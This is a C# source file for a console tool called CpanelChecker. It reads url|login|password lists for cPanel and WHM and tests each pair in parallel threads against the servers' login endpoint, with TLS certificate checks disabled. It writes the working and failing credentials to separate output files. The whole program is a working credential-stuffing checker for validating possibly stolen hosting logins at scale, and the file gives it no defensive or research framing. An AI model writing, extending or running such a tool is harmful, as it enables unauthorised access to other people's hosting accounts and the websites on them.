using Extensions;
using Newtonsoft.Json;
using RestSharp;

namespace CpanelChecker
{
    public class CheckProgram
    {
        private static int splitByCount = 1000;

        private static void Main()
        {
            Environment.CurrentDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
            string[] arguments = Environment.GetCommandLineArgs();
            string cpanelFilePath;
            string whmFilePath;
            string outFolderPath;

            if (arguments.Length < 4)
            {
                return;
            }

            cpanelFilePath = arguments[1];
            whmFilePath = arguments[2];
            outFolderPath = arguments[3];
            if (arguments.Length > 4)
            {
                bool isOtherThreadCount = int.TryParse(arguments[4], out int inThreadCount);
                if (isOtherThreadCount)
                {
                    splitByCount = inThreadCount;
                }
            }
            bool showOutput = arguments.Length > 5 && arguments[5] == "true";
            bool showCheck = arguments.Length > 6 && arguments[6] == "true";
            try
            {
                JsonAnswer answer = new();
                List<string> cpGoodList = new();
                List<string> cpBadList = new();
                List<string> whmGoodList = new();
                List<string> whmBadList = new();

                List<Task> waitingTasks = new();

                if (File.Exists(cpanelFilePath))
                {
                    List<string> lines = File.ReadAllLines(cpanelFilePath).Where(s => !s.IsNullOrEmptyString()).ToList();
                    List<List<string>> partitions = lines.Partitions(splitByCount);
                    foreach (List<string> partition in partitions)
                    {
                        waitingTasks.Add(Task.Run(async () =>
                        {
                            foreach (string row in partition)
                            {
                                string[] parts = row.Split('|');
                                if (parts.Length != 3)
                                {
                                    continue;
                                }

                                string url, login, password;
                                url = parts[0];
                                login = parts[1];
                                password = parts[2];

                                bool? result = await CheckValidPairAsync(url, login, password);
                                if (result.HasValue)
                                {
                                    if (result.Value)
                                    {
                                        cpGoodList.Add(row);
                                        if (showCheck)
                                        {
                                            Console.ForegroundColor = ConsoleColor.Green;
                                            Console.WriteLine($"[C] [P:{partitions.IndexOf(partition)}] [R:{partition.IndexOf(row)}] " + row + "  -  " + result.ToFString());
                                        }
                                    }
                                    else
                                    {
                                        cpBadList.Add(row);
                                        if (showCheck)
                                        {
                                            Console.ForegroundColor = ConsoleColor.Red;
                                            Console.WriteLine($"[C] [P:{partitions.IndexOf(partition)}] [R:{partition.IndexOf(row)}] " + row + "  -  " + result.ToFString());
                                        }
                                    }
                                }
                                else
                                {
                                    if (showCheck)
                                    {
                                        Console.ForegroundColor = ConsoleColor.White;
                                        Console.WriteLine($"[C] [P:{partitions.IndexOf(partition)}] [R:{partition.IndexOf(row)}] " + row + "  -  " + result.ToFString());
                                    }
                                }
                            }
                        }));
                    }
                }
                if (File.Exists(whmFilePath))
                {
                    List<string> lines = File.ReadAllLines(whmFilePath).Where(s => !s.IsNullOrEmptyString()).ToList();
                    List<List<string>> partitions = lines.Partitions(splitByCount);
                    foreach (List<string> partition in partitions)
                    {
                        waitingTasks.Add(Task.Run(async () =>
                        {
                            foreach (string row in partition)
                            {
                                string[] parts = row.Split('|');
                                if (parts.Length != 3)
                                {
                                    continue;
                                }

                                string url, login, password;
                                url = parts[0];
                                login = parts[1];
                                password = parts[2];

                                bool? result = await CheckValidPairAsync(url, login, password);
                                if (result.HasValue)
                                {
                                    if (result.Value)
                                    {
                                        whmGoodList.Add(row);
                                        if (showCheck)
                                        {
                                            Console.ForegroundColor = ConsoleColor.Green;
                                            Console.WriteLine($"[W] [P:{partitions.IndexOf(partition)}] [R:{partition.IndexOf(row)}] " + row + "  -  " + result.ToFString());
                                        }
                                    }
                                    else
                                    {
                                        whmBadList.Add(row);
                                        if (showCheck)
                                        {
                                            Console.ForegroundColor = ConsoleColor.Red;
                                            Console.WriteLine($"[W] [P:{partitions.IndexOf(partition)}] [R:{partition.IndexOf(row)}] " + row + "  -  " + result.ToFString());
                                        }
                                    }
                                }
                                else
                                {
                                    if (showCheck)
                                    {
                                        Console.ForegroundColor = ConsoleColor.White;
                                        Console.WriteLine($"[W] [P:{partitions.IndexOf(partition)}] [R:{partition.IndexOf(row)}] " + row + "  -  " + result.ToFString());
                                    }
                                }
                            }
                        }));
                    }
                }
                Task.WaitAll(waitingTasks.ToArray());

                DirectoryInfo di = new(outFolderPath);
                answer.CpanelGood = MakeFileFromList(cpGoodList, di.FullName, "cp_good.txt");
                answer.CpanelBad = MakeFileFromList(cpBadList, di.FullName, "cp_bad.txt");
                answer.WhmGood = MakeFileFromList(whmGoodList, di.FullName, "whm_good.txt");
                answer.WhmBad = MakeFileFromList(whmBadList, di.FullName, "whm_bad.txt");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine(JsonConvert.SerializeObject(answer));
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("{" + $"\"Error\":\"{ex.Message}\"" + "}");
            }
            if (showOutput)
            {
                Console.ReadKey();
            }
        }

        private static string MakeFileFromList(List<string> list, string foldername, string filename)
        {
            if (list.Any())
            {
                string filePath = foldername + "/" + filename;
                using TextWriter writer = new StreamWriter(filePath);
                foreach (var line in list)
                {
                    writer.WriteLine(line);
                }
                writer.Close();
                return filePath.Replace("\\", "/").Remove(2, 1).Insert(2, "\\");
            }
            else
            {
                return "";
            }
        }

        private static async Task<bool?> CheckValidPairAsync(string url, string login, string password)
        {
            try
            {
                RestClientOptions options;
                RestClient client;
                try
                {
                    options = new RestClientOptions(url)
                    {
                        ThrowOnAnyError = false,
                        RemoteCertificateValidationCallback = delegate { return true; },
                        MaxTimeout = 15000
                    };
                    client = new(options);
                }
                catch (Exception)
                {
                    return null;
                }
                RestRequest request = new("/login/?login_only=1", method: Method.Get);
                request.AddQueryParameter("user", login);
                request.AddQueryParameter("pass", password);
                RestResponse responce = await client.ExecuteAsync(request);
                if (responce.IsSuccessful)
                {
                    if (responce.Content.Contains("\"status\": 1") || responce.Content.Contains("\"status\":1"))
                    {
                        return true;
                    }
                    else
                    {
                        return null;
                    }
                }
                else
                {
                    if (responce.Content == null)
                    {
                        return null;
                    }
                    if (responce.Content.Contains("invalid_login"))
                    {
                        return false;
                    }
                    else if (responce.Content.Contains("invalid_pass"))
                    {
                        return false;
                    }
                    else
                    {
                        return null;
                    }
                }
            }
            catch (Exception)
            {
                return null;
            }
        }

        public class JsonAnswer
        {
            public string CpanelGood { get; set; }
            public string CpanelBad { get; set; }
            public string WhmGood { get; set; }
            public string WhmBad { get; set; }
        }
    }
}